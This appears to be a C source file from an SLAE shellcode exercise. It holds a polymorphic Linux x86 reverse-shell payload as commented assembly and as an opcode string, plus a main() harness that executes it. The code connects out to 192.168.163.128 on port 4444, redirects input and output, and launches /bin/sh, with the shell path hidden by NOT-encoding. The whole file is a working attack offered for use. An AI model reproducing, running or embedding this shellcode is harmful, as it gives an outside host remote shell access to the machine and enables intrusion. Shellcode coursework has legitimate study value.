/*

global _start
section .text
;Auther: H4554n AlMusajjen
;SLAE - 1057 
;Title:linux x86 reverse shellcode
; Orginal Shellcode: https://www.exploit-db.com/exploits/25497/
; Original Shellcode size is 92 bytes 
; my polymorphic version is 87 bytes 

_start:

	;int socketcall(int call, unsigned long *args)
	push 0x66
	pop	eax		;saving one byte here
	xor	ebx,ebx
	cdq			;edx and ecx xoring has been deleted and three bytes has been saved 
	push	ebx		;pushing ebx insted of ecx as 0x0
	inc	ebx		;saving one byte instead of mov bl,0x1
	push	0x6
	push	ebx		;pushing ebx as 0x1 and saving one byte 
				;insted of push 0x1 
	push	0x2
	mov	ecx,esp
	int	0x80
	xchg	esi,eax		;swapping data instead of moving it and 
				;saving one more byte
	mov     al,0x66
	push 	byte 0x2
	pop 	ebx		;this will save us one byte
				;insted of xoring and moving 0x2
	push    0x80a3a8c0	; ip address "192.168.163.128"
	push	word   0x5c11	; port numbrt "4444"
	push 	word   bx
	inc     bl
	mov     ecx,esp
	push    0x10
	push    ecx
	push    esi
	mov     ecx,esp
	int     0x80
	push	0x3
	pop	ecx		;saving one more byte by pushing and-
				;poping it into ecx insted of xoring and-
				; moving 0x3 

dupfd:
	dec     cl
	mov     al,0x3f
	int     0x80
	jne     dupfd
	push    edx
	push    0x978cd091
	not dword [esp]		
	push    0x969dd0d0
	not dword [esp]		;six bytes has been added to decode /bin/sh
	mov     ebx,esp
	push    edx
	push    ebx
	mov     ecx,esp
	push    edx
	mov     edx,esp
	mov	al,0xb
	int     0x80

*/
#include<stdio.h>
#include<string.h>


unsigned char code[] = \
"\x6a\x66\x58\x31\xdb\x99\x53\x43\x6a\x06\x53\x6a\x02\x89\xe1\xcd\x80\x96\xb0\x66\x6a\x02\x5b\x68\xc0\xa8\xa3\x80\x66\x68\x11\x5c\x66\x53\xfe\xc3\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x6a\x03\x59\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x52\x68\x91\xd0\x8c\x97\xf7\x14\x24\x68\xd0\xd0\x9d\x96\xf7\x14\x24\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80";
 
int main()
{

printf("Shellcode Length:  %d\n", (int)strlen(code));

int (*ret)() = (int(*)())code;

ret();

}
